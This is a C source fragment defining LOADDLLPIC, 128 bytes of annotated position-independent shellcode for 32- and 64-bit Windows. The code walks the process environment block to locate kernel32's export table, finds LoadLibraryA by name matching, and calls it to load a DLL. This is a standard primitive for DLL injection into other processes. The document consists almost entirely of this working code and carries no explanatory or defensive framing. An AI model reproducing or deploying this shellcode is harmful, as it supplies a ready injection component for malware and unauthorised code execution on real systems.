
#define LOADDLLPIC_SIZE 128

char LOADDLLPIC[] = {
  /* 0000 */ "\x53"                         /* push rbx                        */
  /* 0001 */ "\x56"                         /* push rsi                        */
  /* 0002 */ "\x57"                         /* push rdi                        */
  /* 0003 */ "\x55"                         /* push rbp                        */
  /* 0004 */ "\x83\xec\x28"                 /* sub esp, 0x28                   */
  /* 0007 */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 0009 */ "\x40\x92"                     /* xchg edx, eax                   */
  /* 000B */ "\x74\x19"                     /* jz 0x26                         */
  /* 000D */ "\x8b\x4c\x24\x3c"             /* mov ecx, [rsp+0x3c]             */
  /* 0011 */ "\x51"                         /* push rcx                        */
  /* 0012 */ "\x64\x8b\x72\x2f"             /* mov esi, [fs:rdx+0x2f]          */
  /* 0016 */ "\x8b\x76\x0c"                 /* mov esi, [rsi+0xc]              */
  /* 0019 */ "\x8b\x76\x0c"                 /* mov esi, [rsi+0xc]              */
  /* 001C */ "\xad"                         /* lodsd                           */
  /* 001D */ "\x8b\x30"                     /* mov esi, [rax]                  */
  /* 001F */ "\x8b\x7e\x18"                 /* mov edi, [rsi+0x18]             */
  /* 0022 */ "\xb2\x50"                     /* mov dl, 0x50                    */
  /* 0024 */ "\xeb\x17"                     /* jmp 0x3d                        */
  /* 0026 */ "\xb2\x60"                     /* mov dl, 0x60                    */
  /* 0028 */ "\x65\x48\x8b\x32"             /* mov rsi, [gs:rdx]               */
  /* 002C */ "\x48\x8b\x76\x18"             /* mov rsi, [rsi+0x18]             */
  /* 0030 */ "\x48\x8b\x76\x10"             /* mov rsi, [rsi+0x10]             */
  /* 0034 */ "\x48\xad"                     /* lodsq                           */
  /* 0036 */ "\x48\x8b\x30"                 /* mov rsi, [rax]                  */
  /* 0039 */ "\x48\x8b\x7e\x30"             /* mov rdi, [rsi+0x30]             */
  /* 003D */ "\x03\x57\x3c"                 /* add edx, [rdi+0x3c]             */
  /* 0040 */ "\x8b\x5c\x17\x28"             /* mov ebx, [rdi+rdx+0x28]         */
  /* 0044 */ "\x8b\x74\x1f\x20"             /* mov esi, [rdi+rbx+0x20]         */
  /* 0048 */ "\x48\x01\xfe"                 /* add rsi, rdi                    */
  /* 004B */ "\x8b\x54\x1f\x24"             /* mov edx, [rdi+rbx+0x24]         */
  /* 004F */ "\x0f\xb7\x2c\x17"             /* movzx ebp, word [rdi+rdx]       */
  /* 0053 */ "\x48\x8d\x52\x02"             /* lea rdx, [rdx+0x2]              */
  /* 0057 */ "\xad"                         /* lodsd                           */
  /* 0058 */ "\x81\x3c\x07\x4c\x6f\x61\x64" /* cmp dword [rdi+rax], 0x64616f4c */
  /* 005F */ "\x75\xee"                     /* jnz 0x4f                        */
  /* 0061 */ "\x80\x7c\x07\x0b\x41"         /* cmp byte [rdi+rax+0xb], 0x41    */
  /* 0066 */ "\x75\xe7"                     /* jnz 0x4f                        */
  /* 0068 */ "\x8b\x74\x1f\x1c"             /* mov esi, [rdi+rbx+0x1c]         */
  /* 006C */ "\x48\x01\xfe"                 /* add rsi, rdi                    */
  /* 006F */ "\x8b\x34\xae"                 /* mov esi, [rsi+rbp*4]            */
  /* 0072 */ "\x48\x01\xf7"                 /* add rdi, rsi                    */
  /* 0075 */ "\xff\xd7"                     /* call rdi                        */
  /* 0077 */ "\x48\x83\xc4\x28"             /* add rsp, 0x28                   */
  /* 007B */ "\x5d"                         /* pop rbp                         */
  /* 007C */ "\x5f"                         /* pop rdi                         */
  /* 007D */ "\x5e"                         /* pop rsi                         */
  /* 007E */ "\x5b"                         /* pop rbx                         */
  /* 007F */ "\xc3"                         /* ret                             */
};